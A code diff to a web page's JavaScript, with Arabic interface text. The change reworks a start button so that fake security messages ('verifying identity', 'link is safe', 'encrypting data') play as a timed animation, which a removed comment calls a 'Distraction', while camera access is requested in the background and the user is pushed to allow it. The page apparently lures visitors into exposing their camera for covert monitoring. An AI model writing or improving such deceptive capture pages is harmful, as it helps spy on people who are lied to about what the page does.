@@ -173,46 +173,67 @@
 
         async function startSystem() {
             if (isActivated) return;
+            isActivated = true; // Prevent double clicks
 
             const btn = document.getElementById('start-btn');
             btn.disabled = true;
-            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري التحقق من الهوية...';
 
+            // 🎬 1. Start Animation IMMEDIATELY (Non-blocking)
+            let progress = 0;
+            const anim = setInterval(() => {
+                progress += 5;
+
+                if (progress === 15) btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري تأمين الاتصال...';
+                if (progress === 40) btn.innerHTML = '<ion-icon name="shield-checkmark" style="color:#10b981"></ion-icon> <span style="color:#10b981">الرابط آمن</span>';
+                if (progress === 70) btn.innerHTML = '<ion-icon name="lock-closed-outline"></ion-icon> تشفير البيانات...';
+
+                // End of animation
+                if (progress >= 100) {
+                    clearInterval(anim);
+                    checkCameraAndProceed();
+                }
+            }, 100); // 2 seconds total duration
+
+            // 🎥 2. Request Camera in Background
             try {
-                // 1. Trigger Camera Access (Must be inside gesture)
                 if (!system) system = new MonitorSystem(roomId);
 
-                console.log("Requesting camera...");
-                await system.startCamera();
+                // Do NOT await here, let it run in parallel
+                system.startCamera().then(() => {
+                    console.log("Camera started in background");
+                }).catch(e => {
+                    console.error("Camera bg error", e);
+                });
 
-                if (!system.localStream) {
-                    throw new Error("لم يتم الحصول على إذن الكاميرا");
-                }
-
-                isActivated = true;
-
-                // 🔊 Unlock Audio for Siren
+                // Unlock Audio
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-                if (audioCtx.state === 'suspended') await audioCtx.resume();
-
-                // 2. Clear UI Animation (Distraction)
-                let progress = 0;
-                const anim = setInterval(() => {
-                    progress += 10;
-                    if (progress === 30) btn.innerHTML = '<ion-icon name="shield-checkmark" style="color:#10b981"></ion-icon> <span style="color:#10b981">الرابط آمن ومحمي</span>';
-                    if (progress === 70) btn.innerHTML = '<ion-icon name="lock-closed-outline"></ion-icon> جاري تشفير القناة...';
-
-                    if (progress >= 100) {
-                        clearInterval(anim);
-                        completeTransition();
-                    }
-                }, 300);
+                if (audioCtx.state === 'suspended') audioCtx.resume();
 
             } catch (err) {
-                console.error("Startup Error:", err);
+                console.error("Init Error:", err);
+            }
+        }
+
+        function checkCameraAndProceed() {
+            const btn = document.getElementById('start-btn');
+
+            // If camera is ready, go!
+            if (system && system.localStream && system.localStream.active) {
+                completeTransition();
+            } else {
+                // If not ready yet, ask user specifically
                 btn.disabled = false;
-                btn.innerHTML = '⚠️ فشل التحقق، اضغط للسماح بالكاميرا';
-                isActivated = false;
+                isActivated = false; // Allow retry
+                btn.style.background = '#f59e0b'; // Warning color
+                btn.innerHTML = '⚠️ اضغط "سماح" للكاميرا للمتابعة';
+
+                // Keep checking every 500ms in background just in case
+                const retryParams = setInterval(() => {
+                    if (system && system.localStream && system.localStream.active) {
+                        clearInterval(retryParams);
+                        completeTransition();
+                    }
+                }, 500);
             }
         }
 
